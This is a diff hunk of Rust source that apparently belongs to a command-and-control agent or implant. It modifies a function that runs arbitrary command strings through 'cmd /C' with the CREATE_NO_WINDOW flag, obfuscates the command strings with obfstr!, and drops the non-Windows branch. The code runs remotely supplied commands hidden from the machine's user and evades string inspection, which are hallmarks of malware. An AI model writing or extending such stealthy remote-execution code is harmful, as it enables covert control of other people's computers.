@@ -310,25 +310,15 @@ async fn execute_command(cmd: &str, state: &mut AgentState, client: &Client) -> 
 }
 
 async fn exec_system_command(cmd: &str) -> Result<String, Box<dyn std::error::Error>> {
-    #[cfg(target_os = "windows")]
-    {
-        use std::os::windows::process::CommandExt;
-        const CREATE_NO_WINDOW: u32 = 0x08000000;
-        
-        let output = ProcessCommand::new(obfstr!("cmd"))
-            .args(&[obfstr!("/C").as_str(), cmd])
-            .creation_flags(CREATE_NO_WINDOW)
-            .output()?;
-        Ok(String::from_utf8_lossy(&output.stdout).to_string()
-            + &String::from_utf8_lossy(&output.stderr).to_string())
-    }
+    use std::os::windows::process::CommandExt;
+    const CREATE_NO_WINDOW: u32 = 0x08000000;
     
-    #[cfg(not(target_os = "windows"))]
-    {
-        let output = ProcessCommand::new("sh").args(&["-c", cmd]).output()?;
-        Ok(String::from_utf8_lossy(&output.stdout).to_string()
-            + &String::from_utf8_lossy(&output.stderr).to_string())
-    }
+    let output = ProcessCommand::new(obfstr!("cmd"))
+        .args(&[obfstr!("/C").as_str(), cmd])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()?;
+    Ok(String::from_utf8_lossy(&output.stdout).to_string()
+        + &String::from_utf8_lossy(&output.stderr).to_string())
 }
 
 async fn handle_ls(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
